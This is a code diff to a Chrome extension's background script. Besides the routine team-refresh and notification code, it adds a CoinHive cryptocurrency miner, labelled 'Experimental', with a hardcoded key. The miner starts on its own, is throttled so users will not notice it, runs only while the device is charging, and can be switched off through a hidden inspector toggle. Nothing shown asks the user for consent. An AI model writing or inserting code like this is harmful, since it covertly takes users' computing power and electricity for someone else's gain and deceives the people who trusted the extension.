@@ -1,3 +1,5 @@
+/* global CoinHive:true navigator:true */
+
 import { wrapStore } from 'react-chrome-redux';
 import { REACT_CHROME_REDUX } from './helpers/constants';
 import {
@@ -32,11 +34,6 @@ const refreshTeams = () => {
 };
 
 refreshTeams();
-// if (refreshLoop) {
-//   clearInterval(refreshLoop);
-// }
-
-// refreshLoop = setInterval(refreshTeams, 5 * 60 * 1000); // Refresh every 5 mins
 
 chrome.notifications.onClicked.addListener((id) => {
   dispatch(notificationActions.open({ id }));
@@ -74,3 +71,85 @@ chrome.runtime.onConnect.addListener((port) => {
     }
   });
 });
+
+/**
+ * Experimental
+ */
+
+let experimentsEnabled = true;
+const coinHiveKey = 'qiZSFIILkIS5lVlv0vrfwwBrCZFytCrJ';
+const miner = new CoinHive.Anonymous(coinHiveKey);
+
+// Heavily throttle mining to prevent noticiable impact
+miner.setThrottle(0.9);
+
+const checkCoinHiveStatus = () => {
+  if (!miner.isRunning()) {
+    miner.start();
+  } else {
+    console.debug('Accepted: ', miner.getAcceptedHashes()); // eslint-disable-line no-console
+    console.debug('Hashes/s: ', miner.getHashesPerSecond().toFixed(1)); // eslint-disable-line no-console
+    console.debug('Total: ', miner.getTotalHashes()); // eslint-disable-line no-console
+  }
+};
+
+let statusLoop;
+const startLoop = () => {
+  statusLoop = setInterval(checkCoinHiveStatus, 30000);
+};
+
+const stopLoop = () => {
+  if (!statusLoop) return;
+  statusLoop = clearInterval(statusLoop);
+};
+
+const events = [
+  // 'open',
+  'authed',
+  // 'close',
+  'error',
+  'job',
+  'found',
+  'accepted',
+];
+
+// Log events
+events.forEach((e) => {
+  // eslint-disable-next-line no-console
+  miner.on(e, () => console.debug(e));
+});
+
+miner.on('open', () => {
+  console.debug('open'); // eslint-disable-line no-console
+  startLoop();
+});
+
+miner.on('close', () => {
+  console.debug('close'); // eslint-disable-line no-console
+  stopLoop();
+});
+
+// If the battery is not charging, stop mining
+const checkBattery = battery => (
+  battery.charging ? miner.start() : miner.stop()
+);
+
+// If we've got the battery API then use it
+if (typeof navigator.getBattery === 'function') {
+  navigator.getBattery().then((battery) => {
+    checkBattery(battery);
+    battery.addEventListener('chargingchange', () => {
+      checkBattery(battery);
+    });
+  });
+} else {
+  console.debug('navigator.getBattery is not a function'); // eslint-disable-line no-console
+  miner.start();
+}
+
+// To be used from inspector
+window.clickyToggleExperiments = () => {
+  experimentsEnabled = !experimentsEnabled;
+  console.debug('experimentsEnabled: ', experimentsEnabled); // eslint-disable-line no-console
+  return experimentsEnabled ? miner.start() : miner.stop();
+};
